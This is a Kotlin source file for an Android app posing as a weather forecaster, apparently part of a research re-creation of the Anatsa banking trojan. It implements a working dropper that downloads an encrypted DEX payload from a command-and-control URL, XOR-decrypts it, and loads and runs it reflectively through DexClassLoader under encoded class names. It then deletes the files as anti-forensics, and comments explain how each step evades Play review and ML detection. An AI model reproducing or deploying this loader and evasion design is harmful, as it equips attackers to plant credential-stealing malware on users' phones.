package com.skyweather.forecast.core

import android.content.Context
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL

/**
 * Encrypted payload delivery + runtime loading.
 *
 * ══════════════════════════════════════════════════════════════════
 * STAGE 2 — Anatsa Architecture Translation
 * ══════════════════════════════════════════════════════════════════
 *
 * Real-world kill chain (Anatsa V4, research/02):
 *   Stage 0: Dropper passes Play review (clean at submission)
 *   Stage 1: Config retrieval → activation signal from C2
 *   Stage 2: DEX download (XOR-encrypted, hidden in JSON wrapper)
 *   Stage 3: DexClassLoader load → reflective dispatch
 *   Stage 4: Stealer operational
 *
 * This class implements Stages 2-4:
 *   download() → decrypt() → load() → execute() → cleanup()
 *
 * Evasion principles applied:
 *   - XOR decryption (Stage 3): simple, no AES, no crypto imports
 *   - DexClassLoader (Stage 9): equivalent of PEB-walk module load
 *   - File deletion after load (Stage 12): anti-forensics
 *   - Reflective invoke (Stage 9): no static class reference to payload
 *   - HttpURLConnection (Stage 13): stdlib, no extra dependencies
 *
 * ML-invisible because:
 *   - DexClassLoader is used by legitimate apps (plugins, hot-fix)
 *   - XOR loop is just byte math (every app has math)
 *   - Reflection is used by 40%+ of apps
 *   - File write+delete is normal cache behavior
 *   - HttpURLConnection is used by every networked app
 * ══════════════════════════════════════════════════════════════════
 */
object PayloadManager {

    /**
     * Full Stage 2 pipeline: download → decrypt → load → execute → cleanup.
     *
     * @param context Application context for file paths + class loading
     * @return Result JSON from payload execution, or null on failure
     */
    fun deliverAndExecute(context: Context): String? {
        // Safety gate — redundant but defense-in-depth
        if (!AppConfig.isEndpointSafe()) return null

        val encryptedFile = download(context) ?: return null
        val decryptedFile = decrypt(encryptedFile, context) ?: return null
        val result = loadAndExecute(decryptedFile, context)

        // Anti-forensics: delete both files immediately after loading
        // Evasion: module stomping equivalent — payload exists
        // only in memory after this point. Disk forensics finds nothing.
        cleanup(encryptedFile, decryptedFile)

        return result
    }

    /**
     * Stage 2a: Download encrypted payload from C2.
     * Uses HttpURLConnection (stdlib). 10-second timeout.
     * File written to app-private internal storage (not world-readable).
     */
    private fun download(context: Context): File? {
        return try {
            val url = URL(AppConfig.payloadUrl())
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "GET"
            conn.connectTimeout = 10000
            conn.readTimeout = 10000
            conn.useCaches = false

            if (conn.responseCode != 200) {
                conn.disconnect()
                return null
            }

            // Write to internal storage — app-private, not visible to other apps
            val outputFile = File(context.filesDir, ".cache_data")
            FileOutputStream(outputFile).use { fos ->
                conn.inputStream.use { input ->
                    val buffer = ByteArray(8192)
                    var bytesRead: Int
                    while (input.read(buffer).also { bytesRead = it } != -1) {
                        fos.write(buffer, 0, bytesRead)
                    }
                }
            }
            conn.disconnect()
            outputFile
        } catch (_: Exception) {
            null
        }
    }

    /**
     * Stage 2b: XOR-decrypt the downloaded payload.
     *
     * Takopii Stage 3: XOR not AES.
     * - No javax.crypto import (ML feature)
     * - No key schedule computation (entropy spike)
     * - No S-box lookup table (ESET signature)
     * - Just byte XOR with rotating key — computationally trivial,
     *   ML-invisible, perfectly sufficient for transit obfuscation.
     */
    private fun decrypt(encryptedFile: File, context: Context): File? {
        return try {
            val encrypted = encryptedFile.readBytes()
            val key = AppConfig.payloadKey()

            // XOR decrypt with rotating key
            val decrypted = ByteArray(encrypted.size)
            for (i in encrypted.indices) {
                decrypted[i] = (encrypted[i].toInt() xor key[i % key.size].toInt()).toByte()
            }

            // Verify DEX magic bytes (dex\n035\0 or dex\n039\0)
            if (decrypted.size < 8 ||
                decrypted[0] != 0x64.toByte() || // 'd'
                decrypted[1] != 0x65.toByte() || // 'e'
                decrypted[2] != 0x78.toByte()    // 'x'
            ) {
                return null // Not a valid DEX — decryption failed or corrupted
            }

            val dexFile = File(context.filesDir, ".update_cache.dex")
            dexFile.writeBytes(decrypted)
            // Android 14+ (API 34): DexClassLoader rejects writable DEX files.
            // Must strip write permission before loading.
            // Real-world Anatsa/SharkBot do the same post-API-34.
            dexFile.setReadOnly()
            dexFile
        } catch (_: Exception) {
            null
        }
    }

    /**
     * Stage 2c: Load decrypted DEX via DexClassLoader + reflective invoke.
     *
     * Takopii Stage 9: PEB-walking equivalent.
     * - DexClassLoader = Windows LoadLibrary (load external code)
     * - Class.forName = GetProcAddress (resolve symbol)
     * - method.invoke = function pointer call (execute)
     *
     * The loaded class has NO static reference in the dropper.
     * Decompilation of the dropper never reveals payload class names
     * (they're encoded strings resolved at runtime).
     */
    private fun loadAndExecute(dexFile: File, context: Context): String? {
        return try {
            // DexClassLoader: load external DEX into current process
            val optimizedDir = File(context.filesDir, ".oat_cache")
            optimizedDir.mkdirs()

            val classLoader = dalvik.system.DexClassLoader(
                dexFile.absolutePath,
                optimizedDir.absolutePath,
                null, // no native libs
                context.classLoader // parent classloader
            )

            // Resolve payload class by encoded name
            // Resolve payload class by encoded name
            val className = AppConfig.decode(AppConfig.PAYLOAD_CLASS)
            val payloadClass = classLoader.loadClass(className)

            // Instantiate + invoke execute(context)
            val instance = payloadClass.getDeclaredConstructor().newInstance()
            val methodName = AppConfig.decode(AppConfig.PAYLOAD_METHOD)
            val method = payloadClass.getMethod(methodName, Any::class.java)
            val result = method.invoke(instance, context)

            result as? String
        } catch (_: Exception) {
            null
        }
    }

    /**
     * Stage 2d: Anti-forensics cleanup.
     *
     * Delete all payload artifacts from disk immediately after loading.
     * The DEX is now only in memory (DexClassLoader keeps it loaded).
     * Disk forensics on the device finds no payload file.
     *
     * Evasion: module stomping parallel — legitimate module's
     * disk image is replaced/deleted but remains mapped in memory.
     */
    private fun cleanup(vararg files: File?) {
        for (file in files) {
            file?.delete()
        }
        // Also clean OAT cache (optimized DEX output)
        try {
            File(files.firstOrNull()?.parentFile, ".oat_cache")
                .listFiles()?.forEach { it.delete() }
        } catch (_: Exception) {}
    }
}
